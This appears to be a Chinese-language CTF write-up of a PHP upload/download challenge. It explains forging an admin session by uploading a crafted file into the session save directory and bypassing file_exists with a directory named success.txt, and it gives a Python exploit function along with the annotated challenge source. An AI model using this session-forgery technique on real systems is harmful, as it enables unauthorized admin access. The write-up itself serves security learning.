tags:: [[CTFWEB/PHP/Session]]

- # 题目
	- 题目提供了上传和下载接口供用户上传和下载文件
	- 在此处绕过检测即可得到flag
		- ```php
		  if($_SESSION['username'] ==='admin') // 需要session伪造
		  {
		      // 检测success文件是否被创建
		      echo "you are admin.\n";
		      $filename='/var/babyctf/success.txt'; // 需要任意文件写入
		      var_dump(file_exists($filename));
		      if(file_exists($filename)){
		          echo "start deleting...\n";
		          // var_dump(safe_delete($filename));
		          die($flag);
		      }
		  }
		  else{
		      $_SESSION['username'] ='guest';
		  }
		  ```
- # 思路
	- 通过伪造session构造假admin身份
	- 通过写入文件夹绕过`file_exists`并获得flag
- # 伪造session
	- 向session文件夹写入文件即可
	- 本体的session格式为`'\x08usernames:5:"admin";'`
		- 注意前方要加`\x08`，没有`|`
	- 伪造session并返回PHPSESSID的代码
	  collapsed:: true
		- ```python
		  def upload_evil_session():
		  
		      session = requests.session()
		      r = session.get(url)
		      sessid = r.cookies["PHPSESSID"]
		      r = base_post(url, data = {
		          "direction": "download",
		          "attr": ".",
		          "filename": "sess_" + sessid
		      }, files = {
		          "up_file": ("a.txt", "123")
		      })
		      with open("test.html", "wb") as f:
		          f.write(r.content)
		      # print("downloaded:", r.text.rpartition("code>")[2])
		      payload = r.text.rpartition("code>")[2].replace("guest", "admin")
		      print(enc_dec.urlencode(payload))
		      payload = '\x08usernames:5:"admin";'
		      sha256_payload = enc_dec.sha256_encode(payload)
		      # evil_session_filename = "sess_" + sha256_payload
		      r = base_post(url, data = {
		          "direction": "upload",
		          "attr": "."
		      }, files = {
		          "up_file": ("sess", payload)
		      })
		      return sha256_payload
		  ```
- # 绕过`file_exists`
	- 注意到可以创建任意文件夹
	- 我们只需要创建一个名为`success.txt`的文件夹即可
- # 题目源码以及分析
	- 代码以及初步分析
	  collapsed:: true
		- ```php
		  <?php
		  
		  error_reporting(0);
		  session_save_path("/var/babyctf/"); // 这里为session伪造提供了便利性
		  session_start();
		  
		  require_once "flag.php";
		  highlight_file(__FILE__);
		  if($_SESSION['username'] ==='admin') // 需要session伪造
		  {
		      // 检测success文件是否被创建
		      echo "you are admin.\n";
		      $filename='/var/babyctf/success.txt'; // 需要任意文件写入
		      var_dump(file_exists($filename));
		      if(file_exists($filename)){
		          echo "start deleting...\n";
		          // var_dump(safe_delete($filename));
		          die($flag);
		      }
		  }
		  else{
		      $_SESSION['username'] ='guest';
		  }
		  
		  // filter_input默认不会做任何事情
		  // direction: upload|download
		  $direction = filter_input(INPUT_POST, 'direction');
		  // attr: 文件夹名
		  $attr = filter_input(INPUT_POST, 'attr');
		  
		  // 构造$dir_path
		  $dir_path = "/var/babyctf/".$attr;
		  if($attr==="private"){
		      $dir_path .= "/".$_SESSION['username'];
		  }
		  
		  
		  if($direction === "upload"){// 上传文件
		      try{
		          // 判断是否在上传
		          if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){
		              throw new RuntimeException('invalid upload');
		          }
		          // 构造file_path: 
		          // filepath = {dir_path}/{name}_{hash}
		          $file_path = $dir_path."/".$_FILES['up_file']['name'];
		          $file_path .= "_".hash_file("sha256",$_FILES['up_file']['tmp_name']);
		          var_dump($file_path);
		          // 过滤file_path
		          if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
		              throw new RuntimeException('invalid file path');
		          }
		          // 创建文件夹并移动文件
		          @mkdir($dir_path, 0700, TRUE);
		          if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){
		              $upload_result = "uploaded";
		          }else{
		              throw new RuntimeException('error while saving');
		          }
		      } catch (RuntimeException $e) {
		          $upload_result = $e->getMessage();
		      }
		  } elseif ($direction === "download") {
		      try{
		          // 获取filename并构造file_path
		          $filename = basename(filter_input(INPUT_POST, 'filename'));
		          $file_path = $dir_path."/".$filename;
		          var_dump($file_path);
		          // 过滤file_path
		          if(preg_match('/(\.\.\/|\.\.\\\\)/', $file_path)){
		              throw new RuntimeException('invalid file path');
		          }
		          // 检测需要下载的文件是否存在
		          if(!file_exists($file_path)) {
		              throw new RuntimeException('file not exist');
		          }
		          // 发送文件
		          header('Content-Type: application/force-download');
		          header('Content-Length: '.filesize($file_path));
		          header('Content-Disposition: attachment; filename="'.substr($filename, 0, -65).'"');
		          if(readfile($file_path)){
		              $download_result = "downloaded";
		          }else{
		              throw new RuntimeException('error while saving');
		          }
		      } catch (RuntimeException $e) {
		          $download_result = $e->getMessage();
		      }
		      exit;
		  }
		  ?>
		  ```